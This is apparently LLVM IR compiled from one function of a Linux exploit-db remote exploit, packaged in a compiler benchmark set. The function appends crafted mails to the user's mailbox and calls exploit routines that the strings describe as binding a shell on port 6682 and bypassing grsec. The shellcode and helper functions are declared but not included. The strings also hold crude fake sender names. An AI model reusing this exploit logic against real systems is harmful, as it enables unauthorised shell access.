; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_99.c_skriptkiddie_s0lar.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_99.c_skriptkiddie_s0lar.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target_info = type { i64, i64, i32, i64 }

@.str = private unnamed_addr constant [183 x i8] c"O shit... is it s0lar running this exp again?\0Anot even a -h? ok lets make her happy and make everyhing magically work\0AWARNING: need write axx on /tmp and use of gdb (no grsec high)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"MAIL\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"getenv()\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"Attempting to write mails to %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"fopen()\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"Andrei Koymaski <andrei gay ru>\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"Easy method portbind 6682\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"Gustavo Lamazza <gustavo gay it>\00", align 1
@shellcode = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [40 x i8] c"From sorbo Tue Nov 29 00:00:00 1983\0A%s\0A\00", align 1
@mail = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [10 x i8] c"fprintf()\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"Osama Bin Laden <osama al-quaeda ar>\00", align 1
@.str.12 = private unnamed_addr constant [70 x i8] c"Hard method (owns grsec) portbind 6682 with vi... spawn shell from vi\00", align 1
@.str.13 = private unnamed_addr constant [36 x i8] c"George Bush <george whitehouse gov>\00", align 1
@PLIST = common dso_local global i64 0, align 8
@lame_cmd = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [66 x i8] c"You should have mail... read with pine and see if this crap worx\0A\00", align 1
@.str.15 = private unnamed_addr constant [24 x i8] c"Enjoy.... s0lar ti amo\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @skriptkiddie_s0lar() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32*, align 8
  %3 = alloca %struct.target_info, align 8
  %4 = alloca %struct.target_info, align 8
  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([183 x i8], [183 x i8]* @.str, i64 0, i64 0))
  call void (%struct.target_info*, ...) @getTarget(%struct.target_info* sret %4)
  %6 = bitcast %struct.target_info* %3 to i8*
  %7 = bitcast %struct.target_info* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %6, i8* align 8 %7, i64 32, i1 false)
  %8 = call i64 @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %9 = inttoptr i64 %8 to i8*
  store i8* %9, i8** %1, align 8
  %10 = load i8*, i8** %1, align 8
  %11 = icmp ne i8* %10, null
  br i1 %11, label %14, label %12

12:                                               ; preds = %0
  %13 = call i32 @die(i32 0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  br label %14

14:                                               ; preds = %12, %0
  %15 = load i8*, i8** %1, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i8* %15)
  %17 = load i8*, i8** %1, align 8
  %18 = call i32* @fopen(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %18, i32** %2, align 8
  %19 = load i32*, i32** %2, align 8
  %20 = icmp ne i32* %19, null
  br i1 %20, label %23, label %21

21:                                               ; preds = %14
  %22 = call i32 @die(i32 1, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  br label %23

23:                                               ; preds = %21, %14
  %24 = call i32 @prepare_mail(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0))
  %25 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %26 = load i64, i64* %25, align 8
  %27 = load i32, i32* @shellcode, align 4
  %28 = call i32 @own_easy(i64 %26, i32 %27)
  %29 = load i32*, i32** %2, align 8
  %30 = load i8*, i8** @mail, align 8
  %31 = call i32 @fprintf(i32* %29, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.9, i64 0, i64 0), i8* %30)
  %32 = icmp slt i32 %31, 1
  br i1 %32, label %33, label %35

33:                                               ; preds = %23
  %34 = call i32 @die(i32 1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  br label %35

35:                                               ; preds = %33, %23
  %36 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 3
  %37 = load i64, i64* %36, align 8
  %38 = icmp ne i64 %37, 0
  br i1 %38, label %39, label %61

39:                                               ; preds = %35
  %40 = call i32 @prepare_mail(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.13, i64 0, i64 0))
  %41 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 2
  %42 = load i32, i32* %41, align 8
  %43 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = load i64, i64* @PLIST, align 8
  %46 = sub nsw i64 %44, %45
  %47 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 1
  %48 = load i64, i64* %47, align 8
  %49 = getelementptr inbounds %struct.target_info, %struct.target_info* %3, i32 0, i32 0
  %50 = load i64, i64* %49, align 8
  %51 = sub nsw i64 %50, 4
  %52 = load i32, i32* @lame_cmd, align 4
  %53 = call i32 @own_hard(i32 %42, i64 %46, i64 %48, i64 %51, i32 %52)
  %54 = load i32*, i32** %2, align 8
  %55 = load i8*, i8** @mail, align 8
  %56 = call i32 @fprintf(i32* %54, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.9, i64 0, i64 0), i8* %55)
  %57 = icmp slt i32 %56, 1
  br i1 %57, label %58, label %60

58:                                               ; preds = %39
  %59 = call i32 @die(i32 1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  br label %60

60:                                               ; preds = %58, %39
  br label %61

61:                                               ; preds = %60, %35
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.14, i64 0, i64 0))
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.15, i64 0, i64 0))
  %64 = call i32 @exit(i32 0) #4
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local void @getTarget(%struct.target_info* sret, ...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i64 @getenv(i8*) #1

declare dso_local i32 @die(i32, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @prepare_mail(i8*, i8*, i8*) #1

declare dso_local i32 @own_easy(i64, i32) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*) #1

declare dso_local i32 @own_hard(i32, i64, i64, i64, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
